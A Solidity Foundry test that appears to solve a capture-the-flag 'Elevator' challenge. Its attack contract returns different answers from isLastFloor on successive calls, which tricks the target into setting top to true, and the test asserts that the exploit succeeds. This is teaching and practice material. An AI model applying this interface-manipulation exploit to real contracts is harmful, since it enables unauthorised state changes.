// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Elevator.sol";
import "forge-std/Test.sol";

contract ElevatorAttack is Building {
    Elevator public elevator;
    uint256 public count;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    function isLastFloor(uint256) external override returns (bool) {
        bool flag = false;
        return count++ == 0 ? flag : !flag;
    }

    function attack(uint256 floor) external {
        elevator.goTo(floor);
    }
}

contract ElevatorTest is Test {
    Elevator public elevator;
    ElevatorAttack public attacker;

    address public deployer = address(0xAAA1);
    address public player = address(0xBEEF);

    function setUp() public {
        vm.prank(deployer);
        elevator = new Elevator();

        vm.startPrank(player);
        attacker = new ElevatorAttack(address(elevator));
        vm.stopPrank();
    }

    function testElevatorAttack() public {
        vm.startPrank(player);

        /// execute exploit
        attacker.attack(10); // any floor number

        vm.stopPrank();

        /// assertions
        assertEq(elevator.floor(), 10);
        assertTrue(elevator.top());
    }
}
